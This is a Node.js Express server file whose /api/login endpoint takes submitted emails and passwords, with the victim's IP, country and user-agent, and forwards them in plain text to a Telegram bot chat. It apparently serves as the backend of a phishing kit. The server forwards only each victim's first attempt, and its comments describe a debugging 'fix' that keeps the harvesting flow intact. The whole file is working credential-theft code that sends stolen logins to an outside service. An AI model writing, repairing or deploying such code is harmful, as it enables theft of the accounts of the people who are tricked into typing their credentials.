// server/index.js
// Fixed version: uses axios instead of node-fetch (avoids node-fetch ESM/require crash),
// and enables CORS so browser preflight/custom-headers won't cause "Failed to fetch".
// Minimal changes only — preserved your original structure, logging and Telegram flow.

const express = require('express');
const axios = require('axios');
const path = require('path');
const cors = require('cors');

require('dotenv').config();

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
  console.warn('Warning: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not set. The /api/login endpoint will not forward messages until these are configured.');
}

const app = express();

// Enable CORS (allow browser to make requests with custom headers / preflight).
// If you prefer to restrict origins, replace cors() with cors({ origin: 'https://yourfrontend.example' })
app.use(cors());

// parse JSON bodies
app.use(express.json());
// Corrected path to serve static files from the 'public' directory
app.use('/public', express.static(path.join(__dirname, '..', 'public')));

// small helper to safely read remote IP
function getIp(req) {
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) {
    // x-forwarded-for can be a list
    return forwarded.split(',')[0].trim();
  }
  return req.socket && req.socket.remoteAddress ? req.socket.remoteAddress : 'unknown';
}

// Endpoint to receive login attempts
app.post('/api/login', async (req, res) => {
  try {
    // Log request arrival and some metadata for debugging
    console.log('--- /api/login called ---');
    console.log('Headers:', req.headers);
    console.log('Body:', req.body);

    const { email, password, userAgent, country } = req.body || {};
    const ip = getIp(req);

    // Basic validation
    if (!email || !password) {
      console.warn('Validation failed: missing email or password');
      return res.status(400).json({ error: 'Missing email or password' });
    }

    // Only forward to Telegram on the very first attempt.
    // The client marks first attempt by sending X-First-Attempt: 1 header.
    const isFirstAttempt = req.headers['x-first-attempt'] === '1';
    console.log('isFirstAttempt:', isFirstAttempt);

    // Compose message for Telegram (include IP, Country, Time)
    const now = new Date();
    const timeString = now.toISOString(); // UTC time
    const localTime = now.toString(); // human readable local string (server local timezone)

    const text = [
      '*Login Attempt Received*',
      `Email: ${escapeMarkdown(String(email))}`,
      `Password: ${escapeMarkdown(String(password))}`,
      `IP: ${escapeMarkdown(String(ip))}`,
      `Country: ${escapeMarkdown(String(country || ''))}`,
      `User-Agent: ${escapeMarkdown(String(userAgent || ''))}`,
      `Time (UTC): ${escapeMarkdown(timeString)}`,
      `Server Time: ${escapeMarkdown(localTime)}`
    ].join('\n');

    if (!isFirstAttempt) {
      console.log('Not first attempt — not forwarding to Telegram.');
      return res.status(200).json({ forwarded: false, reason: 'not_first_attempt' });
    }

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      // For local testing: log to console instead of sending
      console.log('--- Login attempt (first attempt) (not forwarded), set TELEGRAM env to forward ---');
      console.log(text);
      return res.status(200).json({ forwarded: false, warning: 'telegram_not_configured' });
    }

    // Attempt to send to Telegram using axios (works with CommonJS)
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const body = {
      chat_id: TELEGRAM_CHAT_ID,
      parse_mode: 'MarkdownV2', // This was the missing piece
      text
    };

    console.log('Sending message to Telegram API at', url);
    const tgRes = await axios.post(url, body, {
      headers: { 'Content-Type': 'application/json' },
      timeout: 10000
    });

    const tgJson = tgRes.data;
    console.log('Telegram API response:', tgJson);

    if (!tgJson.ok) {
      console.error('Telegram API error:', tgJson);
      // return details in response for debugging (do not expose in production)
      return res.status(502).json({ error: 'Telegram API error', details: tgJson });
    }

    // Success
    console.log('Forwarded to Telegram successfully.');
    return res.json({ forwarded: true });
  } catch (err) {
    console.error('Error handling /api/login', err);
    // Return the error message in JSON for easier debugging (strip stack in prod)
    return res.status(500).json({ error: 'server_error', message: err.message || String(err) });
  }
});

// Serve index.html at the root
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'index.html'));
});


// Helper to escape Markdown special chars for Telegram MarkdownV2
function escapeMarkdown(str) {
  // escape characters: _ * [ ] ( ) ~ ` > # + - = | { } . !
  return String(str).replace(/([_\*\[\]\(\)~`>#+\-=|{}\.!])/g, '\\$1');
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server started on port ${PORT} — open http://localhost:${PORT}`);
});
